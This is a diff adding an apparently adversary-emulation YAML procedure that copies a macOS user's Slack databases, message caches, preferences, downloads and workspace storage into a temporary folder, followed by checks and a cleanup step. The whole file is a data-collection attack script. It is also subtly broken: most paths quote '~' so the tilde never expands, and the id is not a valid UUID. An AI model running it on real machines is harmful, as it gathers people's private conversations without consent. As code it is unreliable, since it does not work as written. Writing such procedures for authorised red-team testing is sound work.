@@ -1,0 +1,107 @@
+id: 1b7a2c0e-8h0i-2j3k-4l5m-6n7o8p9q0r1s
+api_version: 2.0
+metadata:
+  name: Collect Slack Chat History
+  description: Extract and collect chat history and data from Slack application
+  author: TTPForge
+  created: 2026-01-30
+  updated: 2026-01-30
+  tags:
+    - collection
+    - slack
+    - chat-history
+    - application-data
+  
+requirements:
+  platforms:
+    - os: darwin
+  
+args:
+  output_path:
+    description: Output path for Slack data
+    type: string
+    default: "/tmp/slack_data"
+  
+  include_caches:
+    description: Include Slack cache files
+    type: boolean
+    default: true
+
+steps:
+  - name: Create output directory
+    command: mkdir -p {{ output_path }}
+
+  - name: Collect Slack databases
+    command: |
+      slack_path="~/Library/Application Support/Slack"
+      if [ -d "$slack_path" ]; then
+        mkdir -p {{ output_path }}/slack_db
+        find "$slack_path" -name "*.db" -o -name "*.sqlite" 2>/dev/null | xargs -I {} cp {} {{ output_path }}/slack_db/ 2>/dev/null || true
+      fi
+
+  - name: Extract message cache
+    command: |
+      cache_path="~/Library/Caches/com.tinyspeck.slackmacgap"
+      if [ -d "$cache_path" ]; then
+        mkdir -p {{ output_path }}/slack_cache
+        cp -r "$cache_path"/* "{{ output_path }}/slack_cache/" 2>/dev/null || true
+      fi
+
+  - name: Collect Slack preferences
+    command: |
+      find ~/Library/Preferences -name "*slack*" -o -name "*slackmac*" 2>/dev/null | xargs -I {} cp {} {{ output_path }}/ 2>/dev/null || true
+
+  - name: Extract saved state
+    command: |
+      saved_path="~/Library/Saved Application State/com.tinyspeck.slackmacgap.savedState"
+      if [ -d "$saved_path" ]; then
+        cp -r "$saved_path" "{{ output_path }}/saved_state" 2>/dev/null || true
+      fi
+
+  - name: Collect Slack data directory
+    command: |
+      slack_data="~/Library/Application Support/Slack/downloads"
+      if [ -d "$slack_data" ]; then
+        mkdir -p {{ output_path }}/downloads
+        cp -r "$slack_data" "{{ output_path }}/downloads/" 2>/dev/null || true
+      fi
+
+  - name: Extract Slack workspaces metadata
+    command: |
+      metadata_path="~/Library/Application Support/Slack/storage"
+      if [ -d "$metadata_path" ]; then
+        mkdir -p {{ output_path }}/workspace_metadata
+        find "$metadata_path" -type f 2>/dev/null | head -20 | xargs -I {} cp {} {{ output_path }}/workspace_metadata/ 2>/dev/null || true
+      fi
+
+checks:
+  - name: Verify output directory
+    command: test -d {{ output_path }} && echo "Slack output directory created"
+    expected_output: "Slack output directory created"
+
+  - name: Check for Slack databases
+    command: |
+      db_count=$(find {{ output_path }}/slack_db -type f 2>/dev/null | wc -l)
+      echo "Slack database files: $db_count"
+
+  - name: Verify extracted cache
+    command: |
+      if [ -d "{{ output_path }}/slack_cache" ]; then
+        cache_size=$(du -sh {{ output_path }}/slack_cache 2>/dev/null | cut -f1)
+        echo "Slack cache size: $cache_size"
+      fi
+
+tests:
+  - name: default
+    description: Default test with dry run
+    dry_run: true
+    steps:
+      - name: Verify Slack application
+        command: test -d /Applications/Slack.app && echo "Slack app installed"
+
+cleanup:
+  - name: Remove Slack data
+    command: rm -rf {{ output_path }}
+
+  - name: Verify cleanup
+    command: test ! -d {{ output_path }} && echo "Slack data cleanup completed"
